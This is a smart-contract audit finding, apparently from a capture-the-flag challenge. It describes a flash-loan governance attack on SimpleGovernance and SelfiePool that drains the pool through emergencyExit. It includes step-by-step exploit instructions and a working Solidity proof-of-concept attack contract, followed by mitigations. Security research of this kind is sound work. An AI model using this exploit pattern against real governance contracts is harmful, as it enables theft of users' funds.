### [H-1] Flash-loaned governance tokens grant temporary voting power to pass malicious proposals

**Description:** `SimpleGovernance._hasEnoughVotes()` checks voting power via 
`getVotes()`, which returns the CURRENT checkpoint rather than a historical 
snapshot via `getPastVotes()`. This defeats the purpose of the checkpoint 
system, which exists specifically to prevent flash-loan-based governance 
attacks. An attacker can flash loan the governance token, delegate to 
themselves, and immediately queue a malicious action — momentarily holding 
more than 50% of total supply.

**Impact:** An attacker can queue and eventually execute any governance 
action, including `SelfiePool.emergencyExit()`, draining the pool's entire 
token balance to an arbitrary address — without ever holding tokens beyond 
the duration of a single flash loan.

**Proof of Concept:**
1. Flash loan the entire token supply held by the pool.
2. Inside the callback, delegate voting power to self — checkpoint updates 
   immediately to current block.
3. Call `queueAction()` targeting `pool.emergencyExit(recovery)` — passes 
   the `_hasEnoughVotes()` check using current (not historical) votes.
4. Approve and repay the flash loan, completing the loan in the same transaction.
5. Outside the flash loan, warp forward past the 2-day action delay.
6. Call `executeAction()` — drains the pool to recovery.

<details>
<summary>Example Code Snippet</summary>

```solidity
function attack(address token) external {
    pool.flashLoan(IERC3156FlashBorrower(this), address(token), TOKENS_IN_POOL, "");
    vm.warp(block.timestamp + governance.getActionDelay() + 1);
    governance.executeAction(actionId);
}

function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) 
    external returns (bytes32) 
{
    votingToken.delegate(address(this));
    actionId = governance.queueAction(
        address(pool), 0, 
        abi.encodeWithSelector(pool.emergencyExit.selector, recovery)
    );
    votingToken.approve(address(pool), amount + fee);
    return CALLBACK_SUCCESS;
}
```
</details>

**Recommended Mitigation:**
1. Use `getPastVotes()` with a delay (e.g., one block in the past) instead 
   of `getVotes()` for all voting power checks in `queueAction()`.
2. Require a minimum holding period before voting power counts toward 
   proposal thresholds, preventing same-block flash loan exploitation.